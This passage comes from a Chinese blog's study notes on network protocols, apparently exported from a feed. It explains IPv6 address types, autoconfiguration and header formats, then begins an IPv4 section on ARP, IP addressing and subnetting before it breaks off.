title="链路本地地址(Link-local)"></a>链路本地地址(Link-local)</h5><blockquote><p style="color:orange;">链路本地地址具有固定的地址格式，由设备自动生成，范围限制在同一本地链路的节点之间，在邻居发现等IPv6机制中或者没有路由器的网络上用到该类型的地址</p></blockquote><ul><li><p>链路本地地址的组成包括一个特定的前缀<strong>FE80::/64</strong>和低64位的EUI-64接口ID</p></li><li><p>节点启动IPv6协议栈时，节点的每个接口会自动分配一个链路本地地址，这种机制的特点是连接在同一链路上的两个IPv6节点不需要做任何配置就可以通信</p></li><li><p>路由器在源端和目的端对具有链路本地地址的包不予处理，因为永远也不会转发这些包</p></li></ul><img src="./IPv6协议结构/链路本地地址.png"  /><p>在lPv6中，一个有可聚类全球单播地址的节点在本地链路上，使用默认IPv6路由器的链路本地地址，而不使用路由器的可聚类全球单播地址。如果必须发生网络重新编址，即单播可聚类全球前缀更改为一个新的单播可聚类全球前缀时，总能使用链路本地地址到达默认路由器。在网络重新编址过程中，节点和路由器的链路本地地址不会发生变化</p><h5 id="站点本地地址-Site-local"><a href="#站点本地地址-Site-local" class="headerlink" title="站点本地地址(Site-local)"></a>站点本地地址(Site-local)</h5><blockquote><p style="color:red;">站点本地地址也是应用范围受限的地址，类似于IPv4专用地址，可供没有申请到可聚类全球单播地址的组织机构使用</blockquote><ul><li>站点本地地址不是自动生成的</li><li>前48位是固定的，其中前10位是固定的二进制位组合1111111011，后面是38位0(FEC0:/48)，接着是提供单位构建子网的16位的子网ID字段，最后是EUI-64接口ID</li><li>站点本地地址能用在内联网中传送数据，但不允许从站点直接选路到全球Internet。站点内的路由器只能在站点内转发包，而不能把包转发到站点外去。 </li></ul><img src="./IPv6协议结构/站点本地地址.png"  /><h5 id="特殊地址和保留地址"><a href="#特殊地址和保留地址" class="headerlink" title="特殊地址和保留地址"></a>特殊地址和保留地址</h5><ul><li>IPv6地址空间中，第一个1/256的大部分空的地址空间用作特殊地址，包括:<ol><li>未指定地址:全0地址，当没有有效地址时，可采用该地址。作为源地址使用，不能被路由器转发。可以表示为0:0:0:0:0:0:0:0或::</li><li>回返地址:除了最低位外，全为0，即0:0:0:0:0:0:0:1或::1。</li><li>嵌有IPv4地址的IPv6地址:一类允许IPv6节点访问不支持IPv6的IPv4节点（IPv4映象地址)，另一类允许IPv6路由器用隧道方式，在IPv4网络上传送IPv6包(IPv4兼容地址)</li></ol></li><li>NSAP和IPX地址分配<ul><li>lPng的目标之一是要统一整个网络世界，使IP、IPX和OSI网络间能进行互操作。为了支持这种互操作性，IPv6为OSI和IPX各保留了1/128地址空间。IPX地址格式尚未精确定义</li><li>NSAP地址分配的描述见RFC1888 (OSI NSAP和IPv6)</li></ul></li></ul><h4 id="多播地址："><a href="#多播地址：" class="headerlink" title="多播地址："></a>多播地址：</h4><blockquote><p style="color:red;">多播指的是源节点发送的单个数据报可以被指明的多个目的节点收到</p></blockquote><ul><li>IPv6协议中的多播地址用最高8位是11111111(FF)来标识多播地址</li><li>多播地址只能用作目的地址。</li></ul><img src="./IPv6协议结构/多播地址.png" style="zoom:67%;" /><ul><li><p>标识字段：地址格式中的第1个字节为全<code>&quot;1&quot;</code>(FF)，标识其为多播地址</p></li><li><p>标志字段：占4位。目前只定义了第4位，用<code>&quot;0&quot;</code>表示该地址是由Internet编号机构指定的熟知多播地址，<code>1</code>表示特定场合使用的临时多播地址</p></li><li><p>范围字段:占4位，用来限制多播数据流在网络中发送的范围，见下表</p></li></ul><img src="./IPv6协议结构/多播地址范围字段.png" style="zoom:67%;" /><ul><li>组标识符字段:占112位，用于标识多播组，最多可以编码2112个组的ID。</li></ul><h5 id="IPv6具有特别含义的特殊多播地址"><a href="#IPv6具有特别含义的特殊多播地址" class="headerlink" title="IPv6具有特别含义的特殊多播地址"></a>IPv6具有特别含义的特殊多播地址</h5><ul><li>FF01::1表示节点本地范围内所有节点多播地址;</li><li>FF02::1表示链路本地范围内所有节点多播地址;</li><li>FF01:2表示节点本地范围内所有路由器多播地址;</li><li>FF02::2表示链路本地范围内所有路由器多播地址;</li><li>FFO5::2表示站点本地范围内所有路由器多播地址。</li><li>IPv6多播地址中有一种特殊用途的<strong>请求节点(Solicited-node)多播地址</strong>，主要用于重复地址检测(DAD)和获取邻居节点的链路层地址。请求节点多播地址由前缀FFO2::1:FFO0:0/104和单播地址的最后24位组成。</li></ul><p>当节点预订多播地址时，它声明要成为多播的一个成员，于是任何本地路由器将以该节点的名义预订多播地址。同一网络上的其他节点要发送信息到该多播地址时，IP多播包将被封装到链路层多播数据传输单元中，发送给每个订户。从本地网以外来的多播，用同样方法处理，只是传递给路由器，由路由器把包转发给预订节点。</p><blockquote><p style="color:black;">路由器不转发广播包，但对多播而言只要路由器以其它节点的名义预订多播地址，就能有选择地转发多播包</blockquote><h4 id="任播地址"><a href="#任播地址" class="headerlink" title="任播地址"></a>任播地址</h4><p>任播地址是IPv6协议特有的地址类型</p><blockquote><p style="color:orange;">多个节点共享一个任播地址，但只有一个节点接收给任播地址的数据报。适合于一对一组中的一个(One to One of Many)的通信需求</p></blockquote><blockquote><p style="color:blue;">任播地址用来标识通常属于不同节点的一组网络接口，路由器把目标地址是任播地址的数据报发送给离该路由器"最近"的一个接口</p></blockquote><ul><li>任播地址只能用作IPv6数据报的目的地址，只能分配给IPv6路由器</li><li>任播对某些类型的服务特别有用，尤其是对于C/S之间不需要有特定关系的服务，如DNS、NTP等</li></ul><p>任播地址是从单播地址空间中划分出来的，与单播地址有相同的格式，当一个单播地址属于多个接口时，就是任播地址。因为任播地址在形式上与单播地址无法区分开，一个任播地址的每个成员，必须显式地加以配置，以便识别任播地址</p><p><strong>子网路由器任播地址格式:</strong></p><blockquote><p>子网前缀部分设置为路由器所在子网的前缀，地址的其余位设置为0，发送到这个地址上的数据包会被发送到该子网中的一个路由器上</p></blockquote><img src="./IPv6协议结构/子网路由器任播地址格式.png" style="zoom: 80%;" /><p><strong>预留的任播地址(RFC 2526)</strong></p><ul><li>在每个子网内，接口标识符值0—127是为子网任播地址分配而保留的，0—125和127为保留，126用于移动lPv6家园代理(Mobile lPv6 Home Agents)的任播</li><li>预留的任播地址不能分配给单播地址，它们的结构按是否含EUl-64分为两类</li></ul><img src="./IPv6协议结构/预留的任播地址.png" style="zoom:100%;" /><p><strong>节点必须的IPv6地址</strong></p><img src="./IPv6协议结构/节点必须的IPv6地址.png" style="zoom:67%;" /><p><strong>路由器必须的IPv6地址：</strong></p><img src="./IPv6协议结构/路由器必须的IPv6地址.png" style="zoom: 70%;" /><h4 id="IPv6地址配置技术"><a href="#IPv6地址配置技术" class="headerlink" title="IPv6地址配置技术"></a>IPv6地址配置技术</h4><h5 id="路由器地址配置"><a href="#路由器地址配置" class="headerlink" title="路由器地址配置"></a>路由器地址配置</h5><p>与IPv4方法类似，管理员手工为接口配置一个IPv6地址，并指定前缀长度</p><h5 id="主机地址配置"><a href="#主机地址配置" class="headerlink" title="主机地址配置"></a>主机地址配置</h5><ul><li>考虑到主机用途的多样性，采用自动配置方法，常用的自动配置技术包括:有状态自动配置协议(DHCPv6)和无状态自动配置协议。</li></ul><p><strong>手工配置和检测</strong></p><ol><li>建议用于服务器和重要网络设备</li><li>接口地址配置的内容包括:128位IPv6地址和前缀长度</li><li>IPv6地址配置到接口上以后，需要检测所配置的地址在链路上是否<strong>唯一</strong><ul><li>IPv6重复地址检测<strong>DAD</strong>，属于邻居发现(ND，Neighbor Discovery)协议的功能</li></ul></li></ol><p><strong>自动配置</strong></p><ul><li>赋予主机自己的地址参数，包括地址前缀、接口ID</li><li>赋予主机其它的相关参数，包括路由器地址、跳数、MTU…</li></ul><p><strong>自动配置过程</strong></p><ol><li><p>接口初始化，然后产生“tentative”(实验性)地址</p></li><li><p>对“tentative”地址进行重复地址检测(DAD)</p></li><li><p>接口产生link-local地址，具备IP连接能力</p></li><li><p>决定采用何种自动配置技术</p><ul><li>由Router Advertisement报文及主机配置来决定</li><li>无状态自动配置(stateless autoconfiguration)</li><li>有状态自动配置(stateful autoconfiguration)</li></ul></li><li><p>获得全球地址</p></li></ol><h5 id="即插即用"><a href="#即插即用" class="headerlink" title="即插即用"></a>即插即用</h5><ul><li>lPv6用两种不同机制来支持即插即用，即BOOTP和DHCP。这些协议支持“状态自动配置”，即服务器必须管理和保存每个节点的状态信息</li></ul><p><strong>有状态自动配置与无状态自动配置</strong></p><ul><li>有状态自动配置的问题在于:用户必须保持和管理特殊的自动配置服务器以管理所有“状态”</li><li>对于个人或者小型机构，无状态自动配置是较容易的解决方案。这种机制允许个人节点确定自己的IP配置，而不必向服务器显式请求各节点的信息</li></ul><h5 id="同时使用无状态及有状态两种配置方式"><a href="#同时使用无状态及有状态两种配置方式" class="headerlink" title="同时使用无状态及有状态两种配置方式"></a>同时使用无状态及有状态两种配置方式</h5><ul><li>两种类型自动配置方式的合作比单独使用其中一种更易于实现Internet网络连接的即插即用<ul><li>可以使用无状态自动配置生成一个IPv6地址，然后对附加参数使用有状态的自动配置</li></ul></li><li>无状态自动配置要简单的多，为什么还要使用状态自动配置?<ul><li>无状态自动配置对得到IP地址的节点提供最低程序的监视，任一节点可以连接到链路，通过路由器通告来获知网络和子网信息，并构造有效的链路地址</li><li>如果有DHCP服务器的支持，那么机构可以更紧密地控制网络可配置的节点。同时，只有由网络管理员明确授权的节点才能通过DHCP服务器来配置</li></ul></li></ul><h3 id="IPv6协议结构"><a href="#IPv6协议结构" class="headerlink" title="IPv6协议结构"></a>IPv6协议结构</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握IPv6的报头格式#掌握分片报头的格式及用途#理解IPv6数据包的拆分、重组过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="IPv6数据包结构"><a href="#IPv6数据包结构" class="headerlink" title="IPv6数据包结构"></a>IPv6数据包结构</h4><blockquote><p style="color:orange;">由固定首部(base header)和有效载荷(payload)组成：首部长度变为固定的40字节，称为基本首部，所有的扩展首部和上层数据合起来叫做数据报的有效载荷或净负荷</p></blockquote><ul><li>取消不必要的功能，首部的字段数减少到只有8个</li><li>取消了首部检验和字段，加快了路由器处理数据报的速度</li><li>基本首部的后面允许有零个或多个扩展首部。</li></ul><img src="./IPv6协议结构/IPv6数据结构.png" style="zoom:67%;" /><img src="./IPv6协议结构/IPv6数据包结构示意图.png" style="zoom: 50%;" /><center>IPv6数据包结构示意图</center>#### 基本首部<h5 id="基本首部各字段含义："><a href="#基本首部各字段含义：" class="headerlink" title="基本首部各字段含义："></a>基本首部各字段含义：</h5><ul><li>版本:4位，指明了协议的版本，对IPv6该字段总是6。</li><li>区分服务:8位，以前叫做通信流类别，6表示IPv6数据包的类或优先级。类似于IPv4的服务类型字段。</li><li>流标号:20位，流是互联网络上从特定源点到特定终点的一系列数据报。数据流由流标号和源节点的地址唯一标识。所有属于同一个流的数据报都具有同样的流标号、源lP地址和目的IP地址</li><li>有效载荷长度:16位，指明IPv6数据报除基本首部以外的字节数（所有扩展首部都算在有效载荷之内），其最大值是64KB。如果使用逐跳选项扩展头的特大净荷选项，就能传送更大的数据包，此时有效载荷长度置0</li><li>下一个首部:8位，如果IPv6数据报没有扩展首部，它相当于IPv4的协议字段;如果IPv6数据报有扩展首部，它指出第一个扩展首部的类型</li><li>跳数限制:8位，与IPv4的TTL类似。源节点在数据报发出时即设定跳数限制。路由器在转发数据报时将跳数限制字段中的值减1。当跳数限制的值为零时，将此数据报丢弃</li><li>源地址:128位，定义了源主机的IP地址</li><li>目的地址:128位，定义了目的主机的IP地址。如果出现路由头，这个地址不是最终的接收数据包的主机的IPv6地址，而是路由报头列表中的第一个路由器地址</li></ul><img src="./IPv6协议结构/IPv6数据结构与IPv4的对比.png" style="zoom: 50%;" /><h4 id="IPv6拓展首部："><a href="#IPv6拓展首部：" class="headerlink" title="IPv6拓展首部："></a>IPv6拓展首部：</h4><ul><li>它代替了IPv4报头及其选项，增强了IPv6的功能，使其可以支持未来的需求</li><li>扩展首部留给路径两端的源站和目的站主机来处理，中间路由器都不处理扩展首部（除路由选择和逐跳选项扩展首部)，大大提高了路由器的处理效率</li><li>lPv6数据包中可以包含零个或多个具有不同的长度扩展报头。IPv6报头中的下一个报头字段，指向第一个扩展报头。每个扩展报头中，都包含下一个报头字段，指向下一个扩展报头。最后一个扩展报头指出上层协议数据单元的类型，上层协议可以是TCP协议、UDP协议或者ICMPv6协议等。</li></ul><img src="./IPv6协议结构/无扩展首部.png" style="zoom:80%;" /><img src="./IPv6协议结构/有扩展首部.png" style="zoom: 67%;" /><h5 id="六种扩展首部："><a href="#六种扩展首部：" class="headerlink" title="六种扩展首部："></a>六种扩展首部：</h5><p><strong>逐跳选项扩展首部</strong>(Hop-by-Hop Options Header)，<strong>路由选择扩展首部</strong>(Routing Header)，<strong>分片扩展首部</strong>(Fragment Header)，<strong>认证扩展首部</strong>(Authentication Header)，<strong>目的站选项扩展首部</strong>(Destination Header)和封装<strong>安全有效载荷扩展首部</strong>(Encapsulated Security Payload Header)</p><blockquote><p style="color:blue;">注:每个扩展首部的长度应为8个字节的整数倍，是为了满足扩展首部对齐的要求</p></blockquote><h5 id="逐跳选项扩展首部"><a href="#逐跳选项扩展首部" class="headerlink" title="逐跳选项扩展首部"></a>逐跳选项扩展首部</h5><ul><li>逐跳选项扩展首部中最实质的是逐跳选项字段的内容，该字段描述了数据分组转发的特性。从源节点到目的节点的路由上的每个节点，即每个转发包(数据报)的路由器都检查逐跳选项中的信息</li><li>由于它需要每个中间路由器进行处理，所以只在绝对必要的时候才会出现</li><li>必须紧跟在IPv6基本首部后，若存在逐跳选择首部，基本首部中下一个首部字段值为0</li></ul><p><strong>逐跳选项：</strong></p><ul><li>巨型净荷选项:净荷超过65535字节</li><li>路由器警告选项:用于多播侦听发现和资源存储协议</li></ul><blockquote><p>RFC2460中已经将这两个选项废弃。</p></blockquote><img src="./IPv6协议结构/逐跳扩展首部结构.png"  /><h5 id="路由选择扩展首部"><a href="#路由选择扩展首部" class="headerlink" title="路由选择扩展首部"></a>路由选择扩展首部</h5><p>路由选择扩展首部代替了IPv4中所实现的源选路。源选路允许用户指定数据报的路径，即到达目的地沿途必须经过的路由器<br>·前一个首部中的<code>下一个首部</code>的<strong>字段值为43</strong></p><blockquote><p>RFC2460中定义了一种类型，即类型0，只有列表中的路由器才处理路由选择扩展首部，其它路由器不必处理</p></blockquote><img src="./IPv6协议结构/路由选择扩展首部.png" style="zoom: 80%;" /><p><strong>路由选择扩展操作过程</strong></p><ul><li>源节点构造数据报必须经过的路由器列表，构造类型0选路首部（路由器列表、最终目的地址、剩余段数)</li><li>IPv6基本首部的目的地址是路由器列表中的第一个路由器地址,而不是包的最终目的地址。最终目的地址是路由选择扩展首部数据字段的最后一个地址</li><li>在地址列表中的节点接收到该包之后，对IPv6基本首部和路由选择扩展首部进行处理:<ul><li>剩余段数为0，则此路由器节点是该包的最终目的地址</li><li>若此节点不是该包的最终目的地址，将它自己的地址从IPv6首部目的地址字段取出，用路由选择列表中的下一个节点地址代替，同时将剩余段数字段值减1，并把包发送到下一个节点</li><li>重复此过程，直到包到达其最终目的地址。</li></ul></li></ul><h5 id="分段扩展首部"><a href="#分段扩展首部" class="headerlink" title="分段扩展首部"></a>分段扩展首部</h5><blockquote><p style="color:blue;">当源节点发送的IPv6数据报比到达目的节点所经过路径上的最小MTU(PMTU)还要大时，需要对这个数据报进行分段</p></blockquote><p>IPv6协议通过分段扩展首部实现数据报的分段，只允许源节点对数据报进行分段，简化了中间节点对数据报的处理<br>前一个首部中的<code>下一个首部</code>的<strong>字段值为44</strong>。<br>需要进行分段的原始数据报在源节点被分为一系列分段数据报发送出去，每个分段数据报的大小应与传输路径上的最小MTU适应</p><blockquote><p>RFC2460中规定最小MTU值为1280字节</p></blockquote><img src="./IPv6协议结构/分段扩展首部.png"  /><blockquote><p style="color:blue;">对于IPv6固定首部和传输过程中必须由路由器处理的扩展首部如路由选择、逐跳选项扩展首部，不允许分段</p></blockquote><ul><li><p>可分段的部分包括:<strong>载荷、只能在到达最终目的地址时才处理的扩展首部</strong>。</p></li><li><p>将原始数据报中的可分段部分从左到右分成若干片，除最后一个分段外，每一片的长度是8个的整数倍。</p></li><li><p><strong>每个分段单独封装为一个IPv6数据报。</strong></p></li></ul><h5 id="身份认证扩展首部"><a href="#身份认证扩展首部" class="headerlink" title="身份认证扩展首部"></a>身份认证扩展首部</h5><blockquote><p style="color:orange;">为IPv6数据包和IPv6报头中那些经过IPv6网络传输后值不会改变的字段，提供了数据验证、数据完整性和反重放保护</p></blockquote><p>前一个首部中的<code>下一个首部</code>的<strong>字段值为51</strong></p><h5 id="封装安全有效载荷扩展首部"><a href="#封装安全有效载荷扩展首部" class="headerlink" title="封装安全有效载荷扩展首部"></a>封装安全有效载荷扩展首部</h5><ul><li>封装安全有效载荷（ESP）报头和尾部提供了数据机密性、数据验证性、数据完整性，以及对已封装有效载荷的重放保护服务。ESP报头并不为出现在它之前的IPv6报头或扩展报头提供安全服务</li><li>前一个首部中的<code>下一个首部</code>的<strong>字段值为50</strong></li></ul><h5 id="目的站选项扩展首部"><a href="#目的站选项扩展首部" class="headerlink" title="目的站选项扩展首部"></a>目的站选项扩展首部</h5><ul><li><strong>目的站选项扩展首部</strong>携带只需要目的站点检验的可选信息，IPv6目的地址字段所列的第一个目的主机，以及路由选择扩展首部所列的后续目的主机都要处理这个可选信息</li><li>前一个首部中的<code>下一个首部</code>的<strong>字段值为60</strong></li><li>以下两种方式使用目的选项头:<ul><li><strong>如果存在路由报头，则目的选项报头指定了在每个中间目标都要转发或处理的选项，此时目的选项头出现在路由报头之前</strong></li><li><strong>如果不存在路由报头，或者目的选项头出现在路由头之后，则目的选项报头中指定了在最终目标处要转发或处理的洗项</strong></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv4部分协议信息汇总</title>
      <link href="/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/"/>
      <url>/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a>地址解析协议 ARP</h2><p>[TOC]</p><h3 id="ARP的定义与基本功能"><a href="#ARP的定义与基本功能" class="headerlink" title="ARP的定义与基本功能"></a>ARP的定义与基本功能</h3><ul><li><p>掌握ARP协议的报文格式</p></li><li><p>掌握ARP协议的工作原理</p></li><li><p>理解ARP高速缓存的作用</p></li><li><p>掌握ARP缓存表的维护过程</p></li></ul><p><strong>ARP</strong>(Address Resolution Protocol，RFC 826）是根据IP地址获取物理地址的一个TCP/IP协议。主机通过将ARP请求<strong>广播</strong>到网络上的所有主机并接收返回消息来确定目标IP地址的物理地址，同时将IP地址和硬件地址存入本机ARP缓存中，下次请求时直接查询<strong>ARP缓存</strong>。</p><h4 id="物理地址："><a href="#物理地址：" class="headerlink" title="物理地址："></a>物理地址：</h4><p>物理地址通常是由硬件来实现的，例如以太网的物理地址被写入到网卡中，任何一块网卡的物理地址是唯一的</p><blockquote><p style="color:blue;">物理地址的长度和格式取决于具体的网络，以太网的物理地址是6字节地址物理地址可以是单播地址、多播地址或广播地址。</p></blockquote><h4 id="逻辑地址："><a href="#逻辑地址：" class="headerlink" title="逻辑地址："></a>逻辑地址：</h4><p>逻辑地址与物理设备本身没有关联, 逻辑地址可以是单播地址、多播地址和广播地址。</p><blockquote><p style="color:skyblue;">目前Internet上的IPv4协议逻辑地址是32位的IP地址， IPv6地址有128位长</blockquote><h4 id="地址解析"><a href="#地址解析" class="headerlink" title="地址解析:"></a>地址解析:</h4><p>逻辑地址是在网络层使用的，但数据包是在物理网络传递。主机或路由器是通过物理地址来识别的,因此将一个数据包传递到一个主机或路由器要进行寻址，需要将一个逻辑地址映射到相应的物理地址。</p><blockquote><p style="color:blue;">地址解析就是主机在发送帧前将目的逻辑地址转换成目的物理地址的过程。</p></blockquote><h5 id="静态映射"><a href="#静态映射" class="headerlink" title="静态映射:"></a>静态映射:</h5><p>手工创建IP地址与物理地址的映射关系，建立映射表。当已知IP地址时，通过查找映射表得到对应的物理地址。</p><blockquote><p style="color:orange;">局限性: 主机更换了网卡，也就改变了主机的物理地址。当主机从一个网络移到另一个网络时，物理地址没变，但IP地址改变了。·要适应这些变化，会增大维护静态映射表的开销。</p></blockquote><h5 id="用协议实现地址映射："><a href="#用协议实现地址映射：" class="headerlink" title="用协议实现地址映射："></a>用协议实现地址映射：</h5><p>在使用TCP/IP协议的以太网中，<strong>ARP</strong>(Address Resolution Protocol)协议完成将IP地址映射到MAC地址的过程，逆地址解析协议<strong>RARP</strong>(Reverse Address Resolution Protocol)将物理地址映射为IP地址</p><h3 id="ARP的报文格式："><a href="#ARP的报文格式：" class="headerlink" title="ARP的报文格式："></a>ARP的报文格式：</h3><img src="./网际协议IP/ARP的报文格式.png"  /><p style="color:blue; text-indent: 112px;">硬件类型:16bit，定义运行ARP的网络类型，如以太网的硬件类型是1。</p><p style="color:blue; text-indent: 112px;">协议类型:16bit，定义使用ARP的高层协议，如对于IPv4协议，该字段的值是Ox0800。</p><p style="color:blue; text-indent: 112px;">硬件长度:8bit，以字节为单位的物理地址长度，如以太网硬件地址长度为6。</p><p style="color:blue; text-indent: 112px;">协议长度:8bit，以字节为单位的逻辑地址的长度，对于IPv4，该字段为4。<p><p style="color:blue; text-indent: 112px;">操作码:16bit,1表示ARP请求，2表示ARP应答。</p><p style="color:blue; text-indent: 112px;">发送端硬件地址:变长字段，对于以太网该字段长度是6字节</p><p style="color:blue; text-indent: 112px;">发送端逻辑地址:变长字段，对于IPv4地址，该字段长度为4字节。</p><p style="color:rgb(255, 118, 0); text-indent: 112px;">目的端硬件地址:变长字段，对于ARP请求报文，该字段全为0</p><p style="color:blue; text-indent: 112px;">目的端逻辑地址:变长字段，定义目标逻辑地址。</p><p style="color:black;">ARP数据报直接封装在数据链路层的帧中</p><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/ARP封装.png" style="zoom:80%;" /></center><h3 id="ARP的运行过程："><a href="#ARP的运行过程：" class="headerlink" title="ARP的运行过程："></a>ARP的运行过程：</h3><h4 id="数据包传输步骤"><a href="#数据包传输步骤" class="headerlink" title="数据包传输步骤"></a>数据包传输步骤</h4><blockquote><ul><li>发送端知道目的端的IP地址。</li><li>IP要求ARP创建一个ARP请求报文，其中包含了发送方的物理地址、发送方的IP地址和目的端的IP地址。目的端的物理地址用0填充</li><li>将报文传递到数据链路层，并在该层中用<strong>发送方的物理地址作为源地址</strong>，<strong>用物理广播地址作为目的地址</strong>，将其封装在一个帧中。</li><li>因为该帧中包含了一个<strong>广播</strong>目的地址，所以同一链路中的每个主机或路由器都接收到这个帧。所有接收到该帧的主机都将其传递到ARP层进行处理。<strong>除了目的端主机以外的所有主机都丢弃该报文</strong>。</li><li>目的主机用一个包含其物理地址的ARP应答报文<strong>单播</strong>做响应。</li><li>发送方接收到这个应答报文，这样它就知道了目标主机的物理地址。</li><li>将IP数据报封装在一个帧中，并单播到目的地址。</li></ul></blockquote><h3 id="ARP高速缓存："><a href="#ARP高速缓存：" class="headerlink" title="ARP高速缓存："></a>ARP高速缓存：</h3><p>当主机A通过ARP请求得到B的物理地址后就将“IP地址—MAC地址”的绑定信息存储在<strong>高速缓存</strong>中。对于后续发往E的分组，可以通过缓存得到物理地址<br>当ARP被询问一个已知IP地址节点的MAC地址时，先在ARP缓存表查看，若存在，就直接返回MAC地址，若不存在，才发送ARP请求向局域网查询。</p><h4 id="缓存表内容："><a href="#缓存表内容：" class="headerlink" title="缓存表内容："></a>缓存表内容：</h4><p>静态项目一直保留在缓存中，直到重新启动计算机为止。</p><p>动态项目随时间推移自动添加和删除，每个动态ARP缓存项的潜在生命周期是10分钟。<br>新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除;<br>如果某个项目已在使用，则又收到2分钟的生命周期;<br>如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h4 id="arp命令的用法"><a href="#arp命令的用法" class="headerlink" title="arp命令的用法:"></a>arp命令的用法:</h4><p>arp命令用于对本地arp缓存进行操作，不会发送ARP请求</p><blockquote><ul><li>arp -a:              列出ARP缓存中的所有条目</li><li>arp -a ip:          列出缓存中与ip对应的条目</li><li>arp -d:              清空arp缓存</li><li>arp -d ip:          删除缓存中与ip对应的条目</li><li>arp -s ip mac : 在arp缓存中添加一个静态arp条目</li></ul></blockquote><h2 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a>网际协议IP</h2><h3 id="IP协议简介（lP-Internet-Protocol）"><a href="#IP协议简介（lP-Internet-Protocol）" class="headerlink" title="IP协议简介（lP- Internet Protocol）"></a>IP协议简介（lP- Internet Protocol）</h3><ul><li>网际协议IP是TCP/IP最核心的协议，也是最重要的因特网标准协议之一</li><li>IP负责将数据包从源点交付到终点，所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输。</li></ul><h4 id="IP的特性："><a href="#IP的特性：" class="headerlink" title="IP的特性："></a>IP的特性：</h4><blockquote><p style="color:blue;">不可靠:不保证分组成功地送到目的站。任何可靠性的要求必须由上层协议实现。</p></blockquote><blockquote><p style="color:orange;">无连接:IP并不维护任何后续分组的状态信息，每个分组都是相互独立的</p></blockquote><blockquote><p style="color:red;">尽最大努力交付:IP协议尽力发送每个分组，只有当资源用完或网络出现故障时才会发送失败</p></blockquote><h4 id="IP地址及表示方法："><a href="#IP地址及表示方法：" class="headerlink" title="IP地址及表示方法："></a>IP地址及表示方法：</h4><p>IP地址：一个IP地址惟一地标识了Internet上的一台主机，IPv4协议使用32位地址，这表示地址空间是2^32。而IPv6协议使用128位地址，地址空间为2^128。<br>表示方法：点分十进制表示:每个字节用一个十进制数表示。</p><img src="./网际协议IP/IP地址分类.png"/><h5 id="网络号："><a href="#网络号：" class="headerlink" title="网络号："></a>网络号：</h5><p>D类地址和E类地址不划分网络号和主机号。</p><img src="./网际协议IP/网络号.png" style="zoom:67%;" /><h5 id="特殊的IP地址："><a href="#特殊的IP地址：" class="headerlink" title="特殊的IP地址："></a>特殊的IP地址：</h5><blockquote><p style="color:blue;">网络地址:主机号全0的IP地址，不分配给任何主机，作为网络本身的标识</p></blockquote><blockquote><p style="color:orange;">广播地址:主机号为全1的IP地址，用作广播地址，目的地址为广播地址的数据包传递给该网络中的所有节点</p></blockquote><blockquote><p style="color:skyblue;">有限广播地址:32位为全“1”的IP地址(255.255.255.255)，通常由无盘工作站启动时使用，希望从网络IP地址服务器处获得一个IP地址</p></blockquote><blockquote><p style="color:red;">主机本身地址:32位全“0”的IP地址(0.0.0.0)称为主机本身地址</p>- 当一个主机要获得其IP地址时，可以运行一个引导程序，并发送一个以全0为源地址、以全1为目的地址的分组给引导服务器，以获得本主机的IP地址。</blockquote><blockquote><p style="color:black;">环回地址:27.0.0.1称为回环地址，可用来测试TCP/IP协议是否正常工作，常用于本机上软件测试和本机上网络应用程序之间的通信地址。</p>- 使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。</blockquote><h5 id="专用IP地址："><a href="#专用IP地址：" class="headerlink" title="专用IP地址："></a>专用IP地址：</h5><p>专用lIP地址:仅用于专用网内部的本地主机。<br>大多数路由器不转发携带专用IP地址的数据包，本地主机必须经网络地址转换服务器才能访问Internet。<br>专用IP地址范围: </p><img src="./网际协议IP/专用IP地址.png" style="zoom:67%;" /><h4 id="子网划分："><a href="#子网划分：" class="headerlink" title="子网划分："></a>子网划分：</h4><p><strong>Subnetting</strong><br>提高IP空间的利用率，增加IP分配的灵活性。<br>从主机号借用若干个比特作为子网号subnet-id，而主机号host-id也就相应减少若干个比特</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p><h4 id="子网掩码："><a href="#子网掩码：" class="headerlink" title="子网掩码："></a>子网掩码：</h4><blockquote><p style="color:blue;">子网掩码是一个网络号全1，主机号全0的32位二进制数，用于确定P中有多少位用于子网号。</p>- **~~表示方法~~**：点分十进制，IP地址后用`/`后面写明网络号的位数- 子网掩码与IP地址**按位做与**得到IP地址对应的**网络地址**</blockquote><h3 id="IP数据格式："><a href="#IP数据格式：" class="headerlink" title="IP数据格式："></a>IP数据格式：</h3><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png"></p><p>IP数据报由首部和数据两部分组成</p><h4 id="各字段的含义："><a href="#各字段的含义：" class="headerlink" title="各字段的含义："></a>各字段的含义：</h4><p>版本:4 bit，指IP协议的版本，目前的IP协议版本号为4(即IPv4)</p><p>首部长度:4 bit，以4字节为单位，因此IP的首部长度最大是60字节</p><p>服务类型: 8 bit，区分服务，一般不用。</p><p>总长度: 16 bit，首部和数据之和的长度，单位为字节，因此数据报的最大长度为65535字节。总长度不能超过网络的最大传输单元MTU。</p><p>标识:16 